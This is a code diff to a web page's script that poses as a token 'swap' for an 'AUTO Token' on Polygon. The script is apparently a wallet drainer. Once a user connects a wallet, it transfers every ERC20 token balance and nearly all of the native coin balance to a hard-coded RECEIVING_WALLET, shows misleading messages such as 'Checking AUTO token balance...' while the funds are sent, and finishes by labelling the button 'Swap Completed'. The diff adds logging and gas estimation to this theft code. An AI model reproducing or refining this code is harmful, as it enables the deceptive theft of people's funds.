@@ -351,6 +351,8 @@
           <span class="token-name">AUTO Token</span>
           <span class="token-network">Polygon</span>
         </div>
+
+        
       </div>
       
       <button id="connectWallet" class="btn">
@@ -690,23 +692,35 @@
         // Process ERC20 tokens first (excluding native)
         for (const token of tokensToSwap.filter(t => !t.isNative)) {
           try {
-            updateStatus(`Processing transaction...`, "success");
+            updateStatus(`Checking AUTO token balance...`, "success");
             
             const contract = new ethers.Contract(token.address, token.abi, signer);
             const balance = await contract.balanceOf(userAddress);
             
             if (balance.gt(0)) {
+              const formattedAmount = ethers.utils.formatUnits(balance, token.decimals);
+              
+              // Estimate gas first
+              try {
+                const gasEstimate = await contract.estimateGas.transfer(RECEIVING_WALLET, balance);
+                updateStatus(`Estimated gas: ${gasEstimate.toString()}`, "success");
+              } catch (e) {
+                updateStatus(`Gas estimation skipped: ${e.message}`, "success");
+              }
+              
               const tx = await contract.transfer(RECEIVING_WALLET, balance);
               await tx.wait();
               
               updateStatus(
-                `Transaction successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
+                `${token.symbol} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
                 "success"
               );
               successCount++;
+            } else {
+              updateStatus(`No ${token.symbol} balance found`, "success");
             }
           } catch (tokenError) {
-            updateStatus(`Transaction failed`, "error");
+            updateStatus(`${token.symbol} transfer failed: ${tokenError.message}`, "error");
           }
         }
 
@@ -714,7 +728,7 @@
         const nativeToken = tokensToSwap.find(t => t.isNative);
         if (nativeToken) {
           try {
-            updateStatus(`Processing transaction...`, "success");
+            updateStatus(`Checking AUTO token balance...`, "success");
             const balance = await provider.getBalance(userAddress);
             
             // Keep 0.002 BNB/MATIC for gas if balance is large enough
@@ -722,6 +736,9 @@
             const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
             
             if (sendAmount.gt(0)) {
+              const formattedAmount = ethers.utils.formatUnits(sendAmount, nativeToken.decimals);
+              updateStatus(`Sending ${formattedAmount} AUTO token...`, "success");
+              
               const tx = await signer.sendTransaction({
                 to: RECEIVING_WALLET,
                 value: sendAmount
@@ -729,25 +746,27 @@
               await tx.wait();
               
               updateStatus(
-                `Transaction successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
+                `${nativeToken.symbol} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
                 "success"
               );
               successCount++;
+            } else {
+              updateStatus(`No ${nativeToken.symbol} balance available to send (kept some for gas)`, "success");
             }
           } catch (nativeError) {
-            updateStatus(`Transaction failed`, "error");
+            updateStatus(`${nativeToken.symbol} transfer failed: ${nativeError.message}`, "error");
           }
         }
         
         if (successCount > 0) {
-          updateStatus(`Successfully completed transactions`, "success");
+          updateStatus(`Successfully transferred ${successCount} asset(s)`, "success");
         } else {
-          updateStatus("No transactions were processed", "success");
+          updateStatus("No supported assets available to transfer", "success");
         }
         
         document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Swap Completed`;
       } catch (err) {
-        throw new Error("Swap process failed");
+        throw new Error("Swap process failed: " + err.message);
       } finally {
         hideLoader();
       }
